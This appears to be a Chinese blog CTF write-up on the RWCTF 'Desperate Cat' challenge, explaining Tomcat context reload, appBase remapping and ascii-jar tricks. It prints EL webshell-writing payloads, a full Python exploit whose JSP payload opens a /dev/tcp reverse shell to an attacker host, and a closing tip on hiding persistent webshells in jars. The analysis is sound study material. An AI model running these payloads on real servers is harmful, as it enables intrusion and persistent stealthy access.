+<p><a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-7.0-doc/config/context.html">https://tomcat.apache.org/tomcat-7.0-doc/config/context.html</a></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212152411113.png" alt="image-20230212152411113"></p>
+<p>当reloadable被设置为true时，Catalina会监听<code>/WEB-INF/classes/</code>和<code>/WEB-INF/lib</code>下的变化，一旦检测到变化就会reload，通过跟进<code>modified()</code>方法也确实找到了相关的技术实现，准确的说当有以下变化时会返回为true</p>
+<ol>
+<li>/WEB-INF/classes/下class文件lastModified时间改变</li>
+<li>/WEB-INF/lib下的jar包有新增、删除、修改，还是通过lastModified时间来判断</li>
+</ol>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212153545524.png" alt="image-20230212153545524"></p>
+<h4 id="达成reload条件"><a href="#达成reload条件" class="headerlink" title="达成reload条件"></a>达成reload条件</h4><p>那么总结起来，想要触发reload，需要以下条件</p>
+<ol>
+<li>reloadable为true</li>
+<li>class文件或者jar包的Lastmodified Time变化</li>
+</ol>
+<p>设置reloadable还是老方法，在pageContext.servletContext.classLoader.resources.context中就能设置reloadable参数</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212144808459.png" alt="image-20230212144808459"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.servletContext.classLoader.resources.context.reloadable&#x3D;true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>jar包可以通过文件上传的方式来修改lastModified时间</p>
+<h4 id="修改appBase"><a href="#修改appBase" class="headerlink" title="修改appBase"></a>修改appBase</h4><p><strong>但是问题还是没有完全解决</strong></p>
+<p>当 Context reload 时，尽管确实会将我们构造的 Session 里的恶意数据写到本地 JSP，但由于我们写入的 Jar 文件不合法（前后存在脏数据），应用 Context 会 reload 失败，导致部署的这整个应用直接 404 无法访问！</p>
+<p>因此需要修改appBase，从官方文档中找到了appBase相关描述</p>
+<p><a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-8.0-doc/config/host.html">https://tomcat.apache.org/tomcat-8.0-doc/config/host.html</a></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230212161344068.png" alt="image-20230212161344068"></p>
+<p>此虚拟主机的应用程序基目录。 这是一个目录的路径名，该目录可能包含要部署在此虚拟主机上的 Web 应用程序。</p>
+<p>通过在reload之前修改appBase可以做到将任意目录映射到该context下，实现<strong>任意文件读取</strong>或者是<strong>webshell解析</strong>，payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#pageContext.getServletContext().getClassLoader().getResources().getContext().getParent().setAppBase(request.getParameter(&quot;d&quot;));</span><br><span class="line">相当于</span><br><span class="line">$&#123;pageContext.servletContext.classLoader.resources.context.parent.appBase&#x3D;param.d&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. 上传jsp包含el表达式</span><br><span class="line">$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname&#x3D;param.p&#125;</span><br><span class="line">$&#123;sessionScope[param.a]&#x3D;param.b&#125;</span><br><span class="line">$&#123;pageContext.servletContext.classLoader.resources.context.reloadable&#x3D;true&#125;</span><br><span class="line">$&#123;pageContext.servletContext.classLoader.resources.context.parent.appBase&#x3D;param.d&#125;</span><br><span class="line"></span><br><span class="line">2. 访问jsp修改session文件名，写入webshell，设置reloadable为true，修改appBase映射</span><br><span class="line">#linux下</span><br><span class="line">&#x2F;?a&#x3D;hackerqwq&amp;b&#x3D;%3C%25out.println(&quot;shell&quot;)%3B%25%3E&amp;p&#x3D;&#x2F;tmp&#x2F;shell.jsp&amp;d&#x3D;&#x2F;</span><br><span class="line">#windows</span><br><span class="line">&#x2F;?a&#x3D;hackerqwq&amp;b&#x3D;%3C%25out.println(&quot;shell&quot;)%3B%25%3E&amp;p&#x3D;D:&#x2F;test&#x2F;shell.jsp&amp;d&#x3D;D:&#x2F;</span><br><span class="line"></span><br><span class="line">3. 上传任意jar包被添加脏字符后触发reload方法</span><br></pre></td></tr></table></figure>
+
+<p>上传jsp(本地直接拖文件模拟上传)后修改各种属性</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230221222159294.png" alt="image-20230221222159294"></p>
+<p>手动拖一个jar包进<code>/WEB-INF/lib</code>下触发reload,将D:/当成appBase，对子目录进行加载</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230221222423750.png" alt="image-20230221222423750"></p>
+<p>经过一系列context的加载后，终于到了检测到了ROOT的<code>/WEB-INF/lib</code>增加了jar触发reload</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230221224056342.png" alt="image-20230221224056342"></p>
+<p>访问shell.jsp,能够看到jsp代码已经执行成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8888&#x2F;test&#x2F;shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230221224702401.png" alt="image-20230221224702401"></p>
+<p>官方Desperate Cat的writeup</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">PROXIES = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    target_url = sys.argv[<span class="number">1</span>]    <span class="comment"># e.g. http://47.243.235.228:39465/</span></span><br><span class="line">    reverse_shell_host = sys.argv[<span class="number">2</span>]</span><br><span class="line">    reverse_shell_port = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    el_payload = <span class="string">r&quot;&quot;&quot;$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;</span></span><br><span class="line"><span class="string">$&#123;sessionScope[param.b]=param.c&#125;</span></span><br><span class="line"><span class="string">$&#123;pageContext.servletContext.classLoader.resources.context.reloadable=true&#125;</span></span><br><span class="line"><span class="string">$&#123;pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d&#125;&quot;&quot;&quot;</span></span><br><span class="line">    reverse_shell_jsp_payload = <span class="string">r&quot;&quot;&quot;&lt;%Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;sh -i &gt;&amp; /dev/tcp/&quot;&quot;&quot;</span> + reverse_shell_host + <span class="string">&quot;/&quot;</span> + reverse_shell_port + <span class="string">r&quot;&quot;&quot; 0&gt;&amp;1&quot;&#125;);%&gt;&quot;&quot;&quot;</span></span><br><span class="line">    r = requests.post(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export&#x27;</span>,</span><br><span class="line">                      data=&#123;</span><br><span class="line">                          <span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                          <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;a.jsp&#x27;</span>,</span><br><span class="line">                          <span class="string">&#x27;content&#x27;</span>: el_payload,</span><br><span class="line">                      &#125;,</span><br><span class="line">                      proxies=PROXIES)</span><br><span class="line">    shell_path = r.text.strip().split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">-1</span>]</span><br><span class="line">    shell_url = <span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export/<span class="subst">&#123;shell_path&#125;</span>&#x27;</span></span><br><span class="line">    r2 = requests.post(url=shell_url,</span><br><span class="line">                       data=&#123;</span><br><span class="line">                           <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;/tmp/session.jsp&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;voidfyoo&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;c&#x27;</span>: reverse_shell_jsp_payload,</span><br><span class="line">                           <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                       &#125;,</span><br><span class="line">                       proxies=PROXIES)</span><br><span class="line">    r3 = requests.post(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export&#x27;</span>,</span><br><span class="line">                       data=&#123;</span><br><span class="line">                           <span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;./WEB-INF/lib/&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;a.jar&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">                       &#125;,</span><br><span class="line">                       proxies=PROXIES)</span><br><span class="line">    time.sleep(<span class="number">10</span>)  <span class="comment"># wait a while</span></span><br><span class="line">    r4 = requests.get(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/tmp/session.jsp&#x27;</span>, proxies=PROXIES)</span><br></pre></td></tr></table></figure>
+
+<h2 id="WreckTheLine和Sauercloud战队非预期解"><a href="#WreckTheLine和Sauercloud战队非预期解" class="headerlink" title="WreckTheLine和Sauercloud战队非预期解"></a><strong>WreckTheLine</strong>和Sauercloud战队非预期解</h2><p>WreckTheLine和Sauercloud战队的选手采用的方法跟作者的预期解有所不同，他们采用的是构造合法jar包上传到<code>/WEB-INF/lib</code>再通过修改<code>WatchedResources</code>的方法进行reload，最终geshell。</p>
+<p>先简单说一下两个战队的相同地方：</p>
+<ol>
+<li><p>上传ascii-jar到<code>/WEB-INF/lib</code>下</p>
+</li>
+<li><p>修改WatchedResources触发reload</p>
+</li>
+</ol>
+<p>不同地方：</p>
+<ol>
+<li>WreckTheLine战队的师傅将shell写到<code>/META-INF/resources</code>下，reload之后直接在webapp<code>/</code>下就能访问到shell。</li>
+<li>Sauercloud战队的师傅将shell编译为class文件打包为jar包，reload之后通过设置<code>org.apache.jasper.compiler.StringInterpreter</code>，然后再进行jsp的Generator的过程中触发class对应类的实例化，从而rce。</li>
+</ol>
+<p>下面介绍WatchedResources和jsp中有关Generator的知识。</p>
+<h3 id="WatchedResources"><a href="#WatchedResources" class="headerlink" title="WatchedResources"></a>WatchedResources</h3><p>官网介绍：<a target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-7.0-doc/config/context.html">https://tomcat.apache.org/tomcat-7.0-doc/config/context.html</a></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230222004137637.png" alt="image-20230222004137637"></p>
+<p>Tomcat 会有后台线程去监控这些文件资源，在 Tomcat 开启 autoDeploy 的情况下（此值默认为 true，即默认开启 autoDeploy），一旦发现这些文件资源的 lastModified 时间被修改，也会触发 reload：</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/FOh11C4BDicRtdiamzOOn4keD7icfORh2B1cUfGGQbAqjxA5ppxmbElR54dStDHiahIn08Kd6UYajzc1QEMiadXsiayQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>各版本WatchedResource如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Tomcat8</span><br><span class="line"><span class="tag">&lt;<span class="name">WatchedResource</span>&gt;</span>WEB-INF/web.xml<span class="tag">&lt;/<span class="name">WatchedResource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">WatchedResource</span>&gt;</span>$&#123;catalina.base&#125;/conf/web.xml<span class="tag">&lt;/<span class="name">WatchedResource</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#Tomcat9</span><br><span class="line"><span class="tag">&lt;<span class="name">WatchedResource</span>&gt;</span>WEB-INF/web.xml<span class="tag">&lt;/<span class="name">WatchedResource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">WatchedResource</span>&gt;</span>WEB-INF/tomcat-web.xml<span class="tag">&lt;/<span class="name">WatchedResource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">WatchedResource</span>&gt;</span>$&#123;catalina.base&#125;/conf/web.xml<span class="tag">&lt;/<span class="name">WatchedResource</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>WatchedResource可以是文件也可以是目录！！！</li>
+</ul>
+<h3 id="jar包内资源文件映射"><a href="#jar包内资源文件映射" class="headerlink" title="jar包内资源文件映射"></a>jar包内资源文件映射</h3><p>java官方Servlet说明文档：<a target="_blank" rel="noopener" href="https://javaee.github.io/servlet-spec/downloads/servlet-4.0/servlet-4_0_FINAL.pdf">https://javaee.github.io/servlet-spec/downloads/servlet-4.0/servlet-4_0_FINAL.pdf</a></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230223214217010.png" alt="image-20230223214217010"></p>
+<p>提到了很关键的一点</p>
+<blockquote>
+<p>除了JSP和jar包中的/META-INF/resources/中的静态资源，没有其他/WEB-INF/中的资源可以被container直接提供给客户端</p>
+</blockquote>
+<p>翻译过来就是，/META-INF/resources中的静态资源可以直接映射到Servlet的<code>/</code>下</p>
+<h3 id="构造合法jar包"><a href="#构造合法jar包" class="headerlink" title="构造合法jar包"></a>构造合法jar包</h3><p>在Desperate Cat这题的前提条件下，有这么一些条件</p>
+<ul>
+<li>只能上传UTF-8编码的String</li>
+<li>上传文件的前后有脏字符</li>
+<li><code>&amp;&lt;&#39;&gt;&quot;()</code>等字符会被编码</li>
+</ul>
+<p>在这样的条件下想要在ascii(32-127)范围内构造出一个jar包，后续这个jar包前后还要被填充脏字符，听起来难度很大，但是c0ny1师傅实现了，原理是：</p>
+<ol>
+<li>在jar包文件结构的基础上将各部分的字节控制在(0-127)内</li>
+<li>crc，raw_data和compressed_data之间的互相影响关系，通过填充脏字符来解决</li>
+<li>使用phith0n师傅的PaddingZip项目来实现在jar包前后增加脏字符，通过offset来使得jar包依旧有效</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/V5UzhjWKgB7_cAJWer8mZg">https://mp.weixin.qq.com/s/V5UzhjWKgB7_cAJWer8mZg</a></p>
+<p>这里直接用师傅的项目生成jar包</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/c0ny1/ascii-jar">https://github.com/c0ny1/ascii-jar</a></li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/diggid4ever">diggid4ever</a>师傅的改进版更好</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/diggid4ever/ascii-jar">https://github.com/diggid4ever/ascii-jar</a></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.1 生成包含class的ascii jar</span><br><span class="line">➜ ascii-jar python3 ascii-jar-1.py</span><br><span class="line">[-] CRC:False RDL:False CDL:True CDAFL:False Padding data: 1*A</span><br><span class="line">[-] CRC:False RDL:False CDL:True CDAFL:False Padding data: 2*A</span><br><span class="line">[-] CRC:False RDL:False CDL:True CDAFL:False Padding data: 3*A</span><br><span class="line">......</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 247*A</span><br><span class="line">[+] CRC:True RDL:True CDL:True CDAFL:True Padding data: 248*A</span><br><span class="line">[+] Generate ascii01.jar success</span><br><span class="line"></span><br><span class="line">1.2 生成包含META-INF&#x2F;resources&#x2F;的ascii jar</span><br><span class="line">➜  ascii-jar python3 ascii-jar-2.py</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 1*A</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 2*A</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 3*A</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 4*A</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 5*A</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 6*A</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 7*A</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 8*A</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 9*A</span><br><span class="line">[-] CRC:False RDL:True CDL:False CDAFL:True Padding data: 10*A</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 11*A</span><br><span class="line">[-] CRC:False RDL:True CDL:True CDAFL:True Padding data: 12*A</span><br><span class="line">[+] CRC:True RDL:True CDL:True CDAFL:True Padding data: 13*A</span><br><span class="line">[+] Generate ascii02.jar success</span><br></pre></td></tr></table></figure>
+
+<h3 id="jsp编译过程"><a href="#jsp编译过程" class="headerlink" title="jsp编译过程"></a>jsp编译过程</h3><p>参考链接：<a target="_blank" rel="noopener" href="https://blog.ahao.moe/posts/JSP_compile_and_load.html">https://blog.ahao.moe/posts/JSP_compile_and_load.html</a></p>
+<ol>
+<li>客户端请求<code>JSP</code>文件.</li>
+<li><code>Servlet</code>容器将请求交给<code>org.apache.jasper.servlet.JspServlet</code>处理, 具体配置在<code>Tomcat</code>的<code>conf/web.xml</code>中.</li>
+<li><code>JspServlet</code>生成<code>java</code>文件, 编译为<code>class</code>文件, 加载到<code>ClassLoader</code>, 加入缓存中.</li>
+<li>调用生成的<code>Servlet</code>的<code>service</code>方法处理请求.</li>
+</ol>
+<p>主要对Sauercloud战队使用到的<code>org.apache.jasper.compiler.StringInterpreter</code>属性进行一个跟进，以下是从访问jsp到调用<code>newInstance()</code>函数进行rce的一个过程梳理</p>
+<hr>
+<p>首先jsp、jspx在<code>conf/web.xml</code>文件中定义了具体的处理servlet</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.jasper.servlet.JspServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jspx<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所有的jsp和jspx都经过<code>org.apache.jasper.servlet.JspServlet</code>这个Sevlet处理，而从<code>JspServlet</code>到<code>newInstance()</code>经过了以下函数，有兴趣的可以下载Tomcat源码跟进一下</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">org.apache.jasper.servlet.JspServlet#init</span><br><span class="line">org.apache.jasper.servlet.JspServlet#service</span><br><span class="line">org.apache.jasper.servlet.JspServlet#serviceJspFile</span><br><span class="line">org.apache.jasper.servlet.JspServletWrapper#service</span><br><span class="line">org.apache.jasper.JspCompilationContext#compile</span><br><span class="line">org.apache.jasper.compiler.Compiler#compile()</span><br><span class="line">org.apache.jasper.compiler.Compiler#compile(boolean)</span><br><span class="line">org.apache.jasper.compiler.Compiler#compile(boolean, boolean)</span><br><span class="line"><span class="comment">//生成jsp的java代码</span></span><br><span class="line">org.apache.jasper.compiler.Compiler#generateJava</span><br><span class="line">org.apache.jasper.compiler.Generator#generate</span><br><span class="line">org.apache.jasper.compiler.Generator#Generator</span><br><span class="line">org.apache.jasper.compiler.StringInterpreterFactory#getStringInterpreter</span><br><span class="line">org.apache.jasper.compiler.StringInterpreterFactory#createInstance</span><br><span class="line">java.lang.reflect.Constructor#newInstance</span><br></pre></td></tr></table></figure>
+
+<p>挑几个关键的点来突出讲一下</p>
+<ul>
+<li><p>在<code>compile()</code>函数将jsp转换为java代码中会通过<code>jspCompiler.isOutDated()</code>函数判断jsp文件是否过时，有以下两个方法可以让其过时</p>
+<ul>
+<li>可以在<code>web.xml</code>里的<code>JspServlet</code>配置<code>modificationTestInterval</code>参数, 指定一定秒数内<code>return false</code>, 不进行重新编译.</li>
+<li>修改jsp的modified time，即新增/修改jsp的内容</li>
+</ul>
+</li>
+<li><p>在<code>getStringInterpreter</code>函数中会获取context(ServletContext)中<code>org.apache.jasper.compiler.StringInterpreter</code>这个属性的值作为类名进行实例化创建</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230223014927769.png" alt="image-20230223014927769"></p>
+</li>
+</ul>
+<p>最后在createInstance方法中完成实例化创建，也就是我们提前写在构造函数中的恶意代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> StringInterpreter <span class="title">createInstance</span><span class="params">(ServletContext context,</span></span></span><br><span class="line"><span class="function"><span class="params">        String className)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (StringInterpreter) context.getClassLoader().loadClass(</span><br><span class="line">                className).getConstructor().newInstance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><p>对于WreckTheLine战队来说，只需要完成以下两步即可:</p>
+<ul>
+<li><p>构造ascii-jar包，在<code>/META-INF/resources/</code>中写webshell</p>
+</li>
+<li><p>上传任意文件，指定为<code>WEB-INF/tomcat-web.xml</code>目录(题目前提条件提到了如果指定上传的目录不存在则递归创建)，触发reload</p>
+</li>
+</ul>
+<p>本地测试步骤简单很多：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#生成ascii-jar包</span><br><span class="line">python3 ascii-jar-2.py</span><br><span class="line">#将jar包上传到&#x2F;WEB-INF&#x2F;lib目录下</span><br><span class="line">#手动修改web.xml文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230223225103689.png" alt="image-20230223225103689"></p>
+<hr>
+<p>对于Sauercloud战队，需要完成三部:</p>
+<ol>
+<li><p>构造包含class文件的ascii-jar</p>
+</li>
+<li><p>修改WatchedReources触发reload</p>
+</li>
+<li><p>上传jsp文件，包含设置<code>org.apache.jasper.compiler.StringInterpreter</code>属性的EL表达式</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#jsp文件内容</span><br><span class="line">$&#123;applicationScope[param.a]=param.b&#125;</span><br><span class="line">#传入payload</span><br><span class="line">?a=org.apache.jasper.compiler.StringInterpreter&amp;b=Exploit</span><br><span class="line">#相当于执行以下jsp</span><br><span class="line">pageContext.getServletContext().setAttribute(<span class="string">&quot;org.apache.jasper.compiler.StringInterpreter&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">#最后再随便上传一个jsp触发Generator流程</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230223231559736.png" alt="image-20230223231559736"></p>
+<p>属性成功被修改</p>
+</li>
+</ol>
+<p>success文件也创建成功(class文件内容是生成success文件)</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20230223231655772.png" alt="image-20230223231655772"></p>
+<h1 id="攻防应用"><a href="#攻防应用" class="headerlink" title="攻防应用"></a>攻防应用</h1><p>在实际应用中，可以通过上传一个jar包，在<code>/METE-INF/resources/</code>中放置一个webshell直接映射到<code>/</code>目录下做<strong>权限维持</strong>，但是又不存在具体文件，增加了<strong>隐蔽性</strong></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247488297&idx=1&sn=cc3db8ffe79c0340215d24fbc6800f7d&chksm=96f40c44a1838552d400146795a24fc425e8ff480d05521384ef07600cab85ef666bff97d01f&scene=21#wechat_redirect">RWCTF 4th Desperate Cat Writeup</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/V5UzhjWKgB7_cAJWer8mZg">RWCTF 4th Desperate Cat ASCII Jar Writeup</a></li>
+<li><a target="_blank" rel="noopener" href="https://yagsheg.com/2022/02/21/rwctf2022-Desperate-Cat-%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/#%E9%9D%9E%E9%A2%84%E6%9C%9F2-EL%E9%85%8D%E5%90%88StringInterpreter%E8%A7%A6%E5%8F%91%E7%B1%BB%E5%AE%9E%E4%BE%8B%E5%8C%96">writeup</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.ahao.moe/posts/JSP_compile_and_load.html">JSP的编译流程</a></li>
+</ul>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
+            <p>原文链接：<a href="https://hackerqwq.github.io/2023/02/23/Despercate-Cat-%E5%B8%A6%E6%9D%A5%E7%9A%84Tomcat%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/">https://hackerqwq.github.io/2023/02/23/Despercate-Cat-%E5%B8%A6%E6%9D%A5%E7%9A%84Tomcat%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/</a>
+            <p>发表日期：<a href="https://hackerqwq.github.io/2023/02/23/Despercate-Cat-%E5%B8%A6%E6%9D%A5%E7%9A%84Tomcat%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF/">February 23rd 2023, 11:23:53 pm</a>
